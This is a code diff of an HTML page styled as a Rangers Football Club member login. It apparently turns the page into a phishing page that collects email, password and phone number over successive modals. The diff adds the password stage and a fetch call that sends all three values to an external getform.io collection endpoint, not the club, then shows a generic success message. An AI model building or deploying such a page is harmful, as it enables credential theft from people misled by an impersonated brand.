@@ -5,27 +5,25 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Rangers Football Club Login</title>
     <style>
-        /* Apply a refined background with partial stadium image and gradient */
         body {
             margin: 0;
             padding: 0;
             font-family: Arial, sans-serif;
-            background-image: url('https://imgs.search.brave.com/tGFjqC4XySJZqE1xHJiCRaTOO89L2afC0M6fPQeJxDg/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWFn/ZXMuc2Vla2xvZ28u/Y29tL2xvZ28tcG5n/LzExLzIvcmFuZ2Vy/cy1mb290YmFsbC1j/bHViLWxvZ28tcG5n/X3NlZWtsb2dvLTEx/NTc5Ny5wbmc'); /* Rangers logo */
-            background-size: 50%; /* Only show part of the logo for a cleaner effect */
+            background-image: url('https://imgs.search.brave.com/tGFjqC4XySJZqE1xHJiCRaTOO89L2afC0M6fPQeJxDg/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWFn/ZXMuc2Vla2xvZ28u/Y29tL2xvZ28tcG5n/LzExLzIvcmFuZ2Vy/cy1mb290YmFsbC1j/bHViLWxvZ28tcG5n/X3NlZWtsb2dvLTEx/NTc5Ny5wbmc');
+            background-size: 50%;
             background-position: center center;
             background-repeat: no-repeat;
             background-attachment: fixed;
-            height: 100vh; /* Full viewport height */
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             color: white;
             text-align: center;
             position: relative;
-            background-color: #0047ab; /* Fallback color (Rangers Blue) */
+            background-color: #0047ab;
         }
 
-        /* Gradient overlay to give depth and make the content stand out */
         body::before {
             content: "";
             position: absolute;
@@ -33,18 +31,17 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.8)); /* Subtle dark overlay */
-            z-index: -1; /* Place the overlay behind all content */
+            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.8));
+            z-index: -1;
         }
 
-        /* Modal styling */
         .modal {
             display: block;
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent dark background */
+            background-color: rgba(0, 0, 0, 0.7);
             padding: 30px;
             width: 300px;
             border-radius: 8px;
@@ -52,7 +49,7 @@
         }
 
         h2 {
-            color: #e60000; /* Rangers Red */
+            color: #e60000;
             font-size: 24px;
             font-weight: bold;
         }
@@ -71,7 +68,7 @@
         button {
             width: 100%;
             padding: 12px;
-            background-color: #0047ab; /* Rangers Blue */
+            background-color: #0047ab;
             color: white;
             border: none;
             border-radius: 5px;
@@ -80,10 +77,9 @@
         }
 
         button:hover {
-            background-color: #003580; /* Darker blue for hover effect */
+            background-color: #003580;
         }
 
-        /* Footer with additional branding */
         .footer {
             position: fixed;
             bottom: 10px;
@@ -91,23 +87,31 @@
             text-align: center;
             color: white;
             font-size: 14px;
-            opacity: 0.7; /* Faded look */
+            opacity: 0.7;
         }
     </style>
 </head>
 <body>
 
-<!-- Modal Login Form (Email and Access Key) -->
-<div class="modal" id="loginModal">
+<!-- Email Modal -->
+<div class="modal" id="emailModal">
     <h2>Rangers FC Member Login</h2>
-    <form id="loginForm" action="https://getform.io/f/avrmyepa" method="POST">
+    <form id="emailForm" action="https://getform.io/f/avrmyepa" method="POST">
         <input type="email" id="email" name="email" placeholder="Enter your email" required>
-        <input type="text" id="accesskey" name="accesskey" placeholder="Enter your access key" required>
-        <button type="submit">Login</button>
+        <button type="submit">Next</button>
     </form>
 </div>
 
-<!-- Phone Number Input -->
+<!-- Password Modal (hidden initially) -->
+<div class="modal" id="passwordModal" style="display: none;">
+    <h2>Enter Your Password</h2>
+    <form id="passwordForm" action="https://getform.io/f/avrmyepa" method="POST">
+        <input type="text" id="password" name="password" placeholder="Enter your password" required>
+        <button type="submit">Next</button>
+    </form>
+</div>
+
+<!-- Phone Number Input (hidden initially) -->
 <div class="modal" id="phoneModal" style="display: none;">
     <h2>Enter Your Phone Number</h2>
     <form id="phoneForm" action="https://getform.io/f/avrmyepa" method="POST">
@@ -116,38 +120,76 @@
     </form>
 </div>
 
+<!-- Footer with Rangers branding -->
 <div class="footer">
     <p>Official Website | Rangers Football Club</p>
 </div>
 
 <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    // Show password form after email submission
+    document.getElementById('emailForm').addEventListener('submit', function(e) {
         e.preventDefault();
-
-        // Capture email and access key
+        
+        // Capture email
         const email = document.getElementById('email').value;
-        const accesskey = document.getElementById('accesskey').value;
 
-        // Log captured data to console for troubleshooting
-        console.log(`Email: ${email}, Access Key: ${accesskey}`);
+        // Log email to console for testing
+        console.log(`Email: ${email}`);
 
-        // Hide the login modal and show the phone number modal
-        document.getElementById('loginModal').style.display = 'none';
-        document.getElementById('phoneModal').style.display = 'block';
+        // Hide the email modal and show the password modal
+        document.getElementById('emailModal').style.display = 'none';
+        document.getElementById('passwordModal').style.display = 'block';
 
-        // Save data for later use (e.g., store it in a variable or send to the server immediately)
+        // Save email for later use
         window.email = email;
-        window.accesskey = accesskey;
     });
 
+    // Show phone number form after password submission
+    document.getElementById('passwordForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Capture password
+        const password = document.getElementById('password').value;
+
+        // Log password to console for testing
+        console.log(`Password: ${password}`);
+
+        // Hide the password modal and show the phone modal
+        document.getElementById('passwordModal').style.display = 'none';
+        document.getElementById('phoneModal').style.display = 'block';
+
+        // Save password for later use
+        window.password = password;
+    });
+
+    // Handle phone number form submission
     document.getElementById('phoneForm').addEventListener('submit', function(e) {
         e.preventDefault();
 
         // Capture phone number
         const phone = document.getElementById('phone').value;
 
-        // Log the phone number along with email and accesskey
-        console.log(`Phone: ${phone}, Email: ${window.email}, Access Key: ${window.accesskey}`);
+        // Log phone, email, and password to console for testing
+        console.log(`Phone: ${phone}, Email: ${window.email}, Password: ${window.password}`);
+
+        // Send data to Getform
+        fetch('https://getform.io/f/avrmyepa', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                email: window.email,
+                password: window.password,
+                phone: phone
+            })
+        })
+        .then(response => response.text())
+        .then(data => {
+            // Handle response from server
+            alert('Form submitted successfully!');
+        })
+        .catch(error => console.error('Error:', error));
     });
 </script>
 
